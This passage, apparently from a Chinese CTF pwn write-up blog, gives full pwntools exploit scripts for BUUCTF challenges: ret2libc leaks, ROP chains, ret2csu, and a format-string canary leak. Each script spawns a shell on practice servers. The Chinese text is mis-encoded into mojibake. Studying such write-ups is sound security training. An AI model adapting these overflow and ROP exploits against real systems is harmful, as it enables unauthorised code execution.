class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret2libc3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/33&quot;)</span></span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27524</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/33&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x080488bf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x656d6974</span></span><br><span class="line"><span class="comment"># print(&quot;leak libc_start_main_got addr and return to main again!&quot;)</span></span><br><span class="line"><span class="comment"># payload = flat([b&#x27;a&#x27;*0x22,puts_plt,main,libc_start_main_got])</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span>,puts_plt,main,puts_got])</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">b&#x27;Enter your input&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_start_main_addr = u32(c.recv()[0:4])</span></span><br><span class="line">puts_addr = u32(c.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="comment"># log.success(&quot;the leak addr: &quot;+hex(libc_start_main_addr))</span></span><br><span class="line">log.success(<span class="string">&quot;the leak addr: &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main_addr)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"><span class="comment"># libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line">libcbase = puts_addr - <span class="number">0x067360</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_addr = libcbase + libc.dump(&quot;system&quot;)</span></span><br><span class="line">system_addr = libcbase +  <span class="number">0x03cd10</span></span><br><span class="line"><span class="comment"># bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span>,system_addr,<span class="string">b&#x27;aaaa&#x27;</span>,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/33&quot;)</span></span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27524</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/33&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">win1_addr = <span class="number">0x080485CB</span></span><br><span class="line">win2_addr = <span class="number">0x080485D8</span></span><br><span class="line">flag_addr = <span class="number">0x0804862B</span></span><br><span class="line">main_addr = <span class="number">0x0804873B</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Enter your input&gt; &#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> +  p32(win1_addr) + p32(win2_addr) + p32(main_addr) + p32(<span class="number">0xBAAAAAAD</span>)</span><br><span class="line">c.sendline(payload1)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Enter your input&gt; &#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> + p32(flag_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">c.sendline(payload2)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.3tzix3bk3ytc.webp"></p><p><code>0X18+0X04!=0X22</code></p><h2 id="0x22-jarvisoj-level3-x64"><a href="#0x22-jarvisoj-level3-x64" class="headerlink" title="0x22.jarvisoj_level3_x64"></a>0x22.jarvisoj_level3_x64</h2><p><code>ret2libc3 x64</code></p><p><mark>Good for reviewing ret2libc3 under x64</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.5xka6mwd9tkw.webp"></p><p>ä½†æ˜¯æˆ‘å‘ç°å¹¶æ²¡æœ‰æˆ‘æƒ³çš„é‚£ä¹ˆç®€å•ï¼Œå› ä¸ºæ²¡æœ‰è°ƒç”¨writeå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°çš„å¯„å­˜å™¨<code>rdx</code>ï¼Œç°åœ¨è€ƒè™‘ä¸€ä¸‹<code>ret2csu</code>ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.2sjy3jadabgg.webp"></p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸè°ƒç”¨writeå‡½æ•°çš„é‚£ä¸ªæ—¶å€™çš„<code>rdi</code>åˆ°åº•æ˜¯å¤šå°‘ï¼Œå› ä¸ºå…¶æ‰€ç®¡æ§çš„å€¼åªæ˜¯æˆ‘ä»¬writeå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦8ä¸ªå­—èŠ‚ï¼Œå°±è¶³å¤Ÿäº†ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.70i44xzz4mps.webp"></p><p>  é€šè¿‡è¾“å‡ºç»“æœä»¥åŠgdbéƒ¨åˆ†è°ƒè¯•ï¼Œæˆ‘ä»¬å‘ç°<code>rdx</code>çš„å€¼è¿œè¿œå¤§äº8å­—èŠ‚ï¼Œæ•…å¯ä»¥åˆ©ç”¨<code>ret2libc3</code></p><p> <mark>å­˜ç–‘ï¼Œå¦‚ä½•ä½¿ç”¨gdbè°ƒè¯•åˆ°è°ƒç”¨writeå‡½æ•°çš„é‚£ä¸€åˆ»çš„rdxï¼Ÿ</mark></p><p>â€‹                â€”å·²è§£å†³</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/34&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28415</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/34&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc64.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x04006b3</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x04006b1</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> +  p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(<span class="number">0xdeadbeef</span>) + p64(write_plt) +p64(main_addr)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line">read_addr = u64(c.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment"># 0x7f8317132250</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc =LibcSearcher(&quot;read&quot;,read_addr)</span></span><br><span class="line"><span class="comment"># libcbase = read_addr - libc.dump(&#x27;read&#x27;)</span></span><br><span class="line"><span class="comment"># system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># bin_sh = libcbase + libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line">libcbase = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.42c4wfpaanls.webp"></p><p>â€‹    ç”¨LibcSearcheræ²¡æœ‰æˆåŠŸï¼Œç›´æ¥ç”¨çš„BUUä¸Šæä¾›çš„èµ„æºï¼Œå¾ˆå¿«å°±è§£å‡ºæ¥äº†ï¼Œä¹Ÿç†Ÿæ‚‰äº†ä¸€ä¸‹<code>.so</code>æ–‡ä»¶çš„ä½¿ç”¨ã€‚</p><p>â€‹    ç–‘é—®è¿˜åœ¨æˆ‘çš„å¿ƒé‡Œï¼Œå¦‚ä½•åˆ©ç”¨<code>ret2csu</code>æ¥è§£å‡ºè¿™é“é¢˜å‘¢ï¼Ÿ</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230305/%E5%9B%BE%E7%89%87.2y959f4jig1s.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/34&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28439</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/34&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc64.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">csu_behind = <span class="number">0x4006A6</span></span><br><span class="line">csu_front = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r15,r14,r13,ret_addr</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ç¬¬1ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬æƒ³è°ƒç”¨çš„å‡½æ•°åœ°å€</span></span><br><span class="line"><span class="string">    ç¬¬2ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨å‡½æ•°çš„ç¬¬1ä¸ªå‚æ•°</span></span><br><span class="line"><span class="string">    ç¬¬3ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨å‡½æ•°çš„ç¬¬2ä¸ªå‚æ•°</span></span><br><span class="line"><span class="string">    ç¬¬4ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨å‡½æ•°çš„ç¬¬3ä¸ªå‚æ•°</span></span><br><span class="line"><span class="string">    ç¬¬5ä¸ªå‚æ•°æ˜¯è¿”å›åœ°å€</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">    payload += p64(csu_behind)</span><br><span class="line">    payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> <span class="comment">#add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    payload += p64(r13) <span class="comment">#r13</span></span><br><span class="line">    payload += p64(r14) <span class="comment">#r14</span></span><br><span class="line">    payload += p64(r15) <span class="comment">#r15</span></span><br><span class="line">    payload += p64(csu_front)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> <span class="comment"># add *1  + pop * 6 = 8 * 7 = 0x38</span></span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    c.sendline(payload)    </span><br><span class="line">c.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">csu(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main_addr)</span><br><span class="line"></span><br><span class="line">write_addr=u64(c.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&#x27;THE LEAK ADDR:&#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libcbase = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_addr = libcbase + libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_addr = elf.got[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu(read_addr,<span class="number">0</span>,bss_addr,<span class="number">16</span>,main_addr)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input:\n&quot;</span>)</span><br><span class="line">c.send(p64(execve_addr)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># write down shellcode</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;BSS ADDR:&quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">csu(bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">csu(bss_addr,bss_addr+8,0,0,main_addr) </span></span><br><span class="line"><span class="string">å¦‚ä½•ç†è§£è¿™æ®µä»£ç ï¼ŸğŸ‡</span></span><br><span class="line"><span class="string">bss_addrè¢«è°ƒå‡½æ•°åœ°å€ï¼Œbss_addr + 8 æ˜¯è¢«è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æˆ‘ä»¬æŠŠexecve_addrå’Œ&#x27;/bin/sh\x00&#x27;å†™å…¥äº†bssæ®µ</span></span><br><span class="line"><span class="string">execve_addråœ¨bss_addr</span></span><br><span class="line"><span class="string">&#x27;/bin/sh\x00&#x27;åœ¨bss_addr + 8 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x23-wustctf2020-getshell"><a href="#0x23-wustctf2020-getshell" class="headerlink" title="0x23.wustctf2020_getshell"></a>0x23.wustctf2020_getshell</h2><p><code>easy_ret2text</code></p><h2 id="0x24-jarvisoj-level4"><a href="#0x24-jarvisoj-level4" class="headerlink" title="0x24.jarvisoj_level4"></a>0x24.jarvisoj_level4</h2><p><code>ret2libc3 x86</code></p><h2 id="0x25-bjdctf-2020-babyrop2"><a href="#0x25-bjdctf-2020-babyrop2" class="headerlink" title="0x25.bjdctf_2020_babyrop2"></a>0x25.bjdctf_2020_babyrop2</h2><p><code>canary &amp; ret2libc3 &amp; fmt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/37&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25862</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/37&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/libc/16libc64.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)</span><br><span class="line">fmt = <span class="string">&#x27;%11$p&#x27;</span></span><br><span class="line">c.sendline(fmt)</span><br><span class="line">c.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(c.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret =<span class="number">0x00400993</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x04005f9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>) +p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)</span><br><span class="line">fmt = <span class="string">&#x27;%11$p&#x27;</span></span><br><span class="line">c.sendline(fmt)</span><br><span class="line">c.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(c.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)+ p64(pop_rdi_ret) + p64(bin_sh)+p64(system_addr) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x26-pwnable-orw"><a href="#0x26-pwnable-orw" class="headerlink" title="0x26.pwnable_orw"></a>0x26.pwnable_orw</h2><p><code>orw</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230307/%E5%9B%BE%E7%89%87.2at0igwhvwhs.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/38&quot;)</span></span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25575</span>)</span><br><span class="line"><span class="comment"># elf = 